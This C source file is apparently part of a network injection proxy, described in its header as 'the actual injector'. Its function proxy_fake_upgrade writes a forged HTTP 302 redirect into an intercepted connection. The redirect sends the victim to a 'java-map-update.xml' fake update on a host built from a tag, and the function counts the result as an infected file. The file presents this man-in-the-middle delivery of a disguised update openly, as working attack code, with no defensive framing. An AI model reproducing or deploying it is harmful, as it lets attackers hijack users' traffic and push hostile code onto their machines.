/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_replace.c 3560 2011-06-07 15:00:02Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <signal.h>
#include <bio_replacer.h>

/* globals */


/* protos */

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file, char *tag, char *host);

/************************************************/

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host)
{
   char header[HTTP_HEADER_LEN];
   char ipa_url[MAX_URL];

   /* calculate and replace the IPA_URL in the file */
   snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);

   DEBUG_MSG(D_INFO, "Tag: %s, sending fake upgrade redirect [%s/%s] ", tag, file, "java-map-update.xml");

   snprintf(header, HTTP_HEADER_LEN, "HTTP/1.0 302 Found\r\n"
      "Location: %s/%s\r\n"
      "Content-Type: text/html\r\n"
      "Connection: close\r\n"
      "\r\n", ipa_url, "java-map-update.xml");

   BIO_write(*cbio, header, strlen(header));

   GBL_STATS->inf_files++;
   return ESUCCESS;
}


/* EOF */

// vim:ts=3:expandtab
